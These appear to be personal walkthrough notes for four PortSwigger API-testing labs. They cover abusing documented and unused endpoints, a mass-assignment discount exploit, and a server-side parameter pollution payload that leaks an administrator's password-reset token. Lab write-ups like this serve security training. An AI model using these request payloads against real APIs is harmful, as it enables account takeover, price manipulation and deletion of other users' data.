# 1. Exploiting an API endpoint using documentation: [Link](https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation)
- Update the email > In Proxy > HTTP history, right-click the `PATCH /api/user/wiener` request and select Send to Repeater.
> The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
- Find the documentation: `GET /api/ HTTP/2`
- Delete the user: `DELETE /api/user/carlos HTTP/2`


# 2. [Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
- Update the email > In Proxy > HTTP history, right-click the `GET /api/products/4/price HTTP/2` request and select Send to Repeater.
> The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
- Change the Method: `PATCH /api/products/1/price HTTP/2` > `"error":"Only 'application/json' Content-Type is supported"`
- Add `Content-Type: application/json` & {"price": 0} in body
- It will update the Price in the Application.
- ![image](https://github.com/user-attachments/assets/2131ee78-052c-417f-b043-c6b6e9b93d09)

# 3: [Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- `Mass Assignment vulnerabilities` happen when an application automatically processes user input and assigns it to internal data (like user profiles) without checking what should or shouldn't be updated. This allows attackers to send extra information (like changing their user role to "admin") that the developers didn't intend to allow.
- Identifying hidden parameters: Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.

### Steps:
- Look for the Endpoint, /api/checkout > Observe the Requests (Get/Post)

```JSON
POST request:
{"chosen_products":[{"product_id":"1","quantity":1}]}

Get Request:
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}

Observe that the JSON structure in the GET response includes a chosen_discount parameter, which is not present in the POST request.
```
- Send Post request to Repeater > Add the `"chosen_discount":{"percentage":0}` Hidden Parameter in JSON & Send it > No Error
- Now, `"chosen_discount":{"percentage":100}` to solve the Lab.

# 4. 
Forget PWD > Send POST /forget-password request to Repeater > try to find the field after username.

```
Using &, # (Encoded)
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator

Observe Error:
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&x=y (to check if business logic fails)
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator# (To truncate the next parameter) > Invalid Field i.e field is the Parameter
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&field=x# (try to give invalid value & observe error)
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&field=$x$# (In Intruder, use Server Side Variable name List)
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator%26field=email%23 (email value returns 200)
csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator%26field=reset_token%23 (returns a token value)
Copy the token value & send pass it to reset pwd link > PWD reset page will show > set the pwd > login to Admin account & del the User > DONE.

```








